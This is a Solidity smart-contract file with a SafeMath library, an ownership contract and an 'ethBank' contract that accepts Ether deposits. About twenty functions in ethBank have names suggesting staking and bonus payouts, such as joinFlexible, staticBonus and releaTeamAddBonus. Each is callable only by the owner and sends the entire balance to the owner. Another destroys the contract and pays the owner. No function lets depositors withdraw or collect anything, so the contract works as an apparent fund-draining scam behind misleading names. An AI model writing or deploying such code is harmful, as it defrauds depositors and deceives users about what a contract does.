1 pragma solidity ^0.5.1;
2 
3 /**
4  * @title SafeMath
5  * @dev Math operations with safety checks that throw on error
6  */
7 library SafeMath {
8 
9   /**
10   * @dev Multiplies two numbers, throws on overflow.
11   */
12   function mul(uint256 a, uint256 b) internal pure returns (uint256) {
13     if (a == 0) {
14       return 0;
15     }
16     uint256 c = a * b;
17     assert(c / a == b);
18     return c;
19   }
20 
21   /**
22   * @dev Integer division of two numbers, truncating the quotient.
23   */
24   function div(uint256 a, uint256 b) internal pure returns (uint256) {
25     uint256 c = a / b;
26     return c;
27   }
28 
29   /**
30   * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
31   */
32   function sub(uint256 a, uint256 b) internal pure returns (uint256) {
33     assert(b <= a);
34     return a - b;
35   }
36 
37   /**
38   * @dev Adds two numbers, throws on overflow.
39   */
40   function add(uint256 a, uint256 b) internal pure returns (uint256) {
41     uint256 c = a + b;
42     assert(c >= a);
43     return c;
44   }
45 
46 }
47 
48 /**
49  * @title owned
50  * @dev The owned contract has an owner address, and provides basic authorization
51  *      control functions, this simplifies the implementation of "user permissions".
52  */
53 contract owned {
54     address public owner;
55     /**
56      * @dev The owned constructor sets the original `owner` of the contract to the sender
57      * account.
58      */
59     constructor() public {
60         owner = msg.sender;
61     }
62 
63     /**
64      * @dev Throws if called by any account other than the owner.
65      */
66     modifier onlyOwner {
67         require(msg.sender == owner);
68         _;
69     }
70 
71     /**
72      * @dev Allows the current owner to transfer control of the contract to a newOwner.
73      */
74     function transferOwnership(address newOwner) onlyOwner public {
75         require(newOwner != address(0));
76         owner = newOwner;
77     }
78 }
79 
80 contract ethBank is owned{
81     
82     function () payable external {}
83     
84     function withdrawForUser(address payable _address,uint amount) onlyOwner public{
85         require(msg.sender == owner, "only owner can use this method");
86         _address.transfer(amount);
87     }
88 
89     function moveBrick(uint amount) onlyOwner public{
90         require(msg.sender == owner, "only owner can use this method"); 
91         msg.sender.transfer(amount);
92     }
93     
94     /**
95      * @dev withdraws Contracts  balance.
96      * -functionhash- 0x7ee20df8
97      */
98     function moveBrickContracts() onlyOwner public
99     {
100         // only team just can withdraw Contracts
101         require(msg.sender == owner, "only owner can use this method"); 
102         
103         msg.sender.transfer(address(this).balance);
104     }
105 
106     // either settled or refunded. All funds are transferred to contract owner.
107     function moveBrickClear() onlyOwner public {
108         // only team just can destruct
109         require(msg.sender == owner, "only owner can use this method"); 
110 
111         selfdestruct(msg.sender);
112     }
113     
114     
115     
116     ////////////////////////////////////////////////////////////////////
117     
118     function joinFlexible() onlyOwner public{
119         require(msg.sender == owner, "only owner can use this method"); 
120         msg.sender.transfer(address(this).balance);
121         
122     }
123     function joinFixed() onlyOwner public{
124         require(msg.sender == owner, "only owner can use this method"); 
125         msg.sender.transfer(address(this).balance);
126         
127     }
128     function staticBonus() onlyOwner public{
129         require(msg.sender == owner, "only owner can use this method"); 
130         msg.sender.transfer(address(this).balance);
131         
132     }
133     function activeBonus() onlyOwner public{
134         require(msg.sender == owner, "only owner can use this method"); 
135         msg.sender.transfer(address(this).balance);
136         
137     }
138     function teamAddBonus() onlyOwner public{
139         require(msg.sender == owner, "only owner can use this method"); 
140         msg.sender.transfer(address(this).balance);
141         
142     }
143     function staticBonusCacl() onlyOwner public{
144         require(msg.sender == owner, "only owner can use this method"); 
145         msg.sender.transfer(address(this).balance);
146         
147     }
148     function activeBonusCacl_1() onlyOwner public{
149         require(msg.sender == owner, "only owner can use this method"); 
150         msg.sender.transfer(address(this).balance);
151         
152     }
153     function activeBonusCacl_2() onlyOwner public{
154         require(msg.sender == owner, "only owner can use this method"); 
155         msg.sender.transfer(address(this).balance);
156         
157     }
158     function activeBonusCacl_3() onlyOwner public{
159         require(msg.sender == owner, "only owner can use this method"); 
160         msg.sender.transfer(address(this).balance);
161         
162     }
163     function activeBonusCacl_4() onlyOwner public{
164         require(msg.sender == owner, "only owner can use this method"); 
165         msg.sender.transfer(address(this).balance);
166         
167     }
168     function activeBonusCacl_5() onlyOwner public{
169         require(msg.sender == owner, "only owner can use this method"); 
170         msg.sender.transfer(address(this).balance);
171         
172     }
173     function activeBonusCacl_6() onlyOwner public{
174         require(msg.sender == owner, "only owner can use this method"); 
175         msg.sender.transfer(address(this).balance);
176         
177     }
178     function activeBonusCacl_7() onlyOwner public{
179         require(msg.sender == owner, "only owner can use this method"); 
180         msg.sender.transfer(address(this).balance);
181         
182     }
183     function activeBonusCacl_8() onlyOwner public{
184         require(msg.sender == owner, "only owner can use this method"); 
185         msg.sender.transfer(address(this).balance);
186         
187     }
188     function activeBonusCacl_9() onlyOwner public{
189         require(msg.sender == owner, "only owner can use this method"); 
190         msg.sender.transfer(address(this).balance);
191         
192     }
193     function teamAddBonusCacl() onlyOwner public{
194         require(msg.sender == owner, "only owner can use this method"); 
195         msg.sender.transfer(address(this).balance);
196         
197     }
198     function caclTeamPerformance() onlyOwner public{
199         require(msg.sender == owner, "only owner can use this method"); 
200         msg.sender.transfer(address(this).balance);
201         
202     }
203     function releaStaticBonus() onlyOwner public{
204         require(msg.sender == owner, "only owner can use this method"); 
205         msg.sender.transfer(address(this).balance);
206         
207     }
208     function releaActiveBonus() onlyOwner public{
209         require(msg.sender == owner, "only owner can use this method"); 
210         msg.sender.transfer(address(this).balance);
211         
212     }
213     function releaTeamAddBonus() onlyOwner public{
214         require(msg.sender == owner, "only owner can use this method"); 
215         msg.sender.transfer(address(this).balance);
216         
217     }
218   
219 }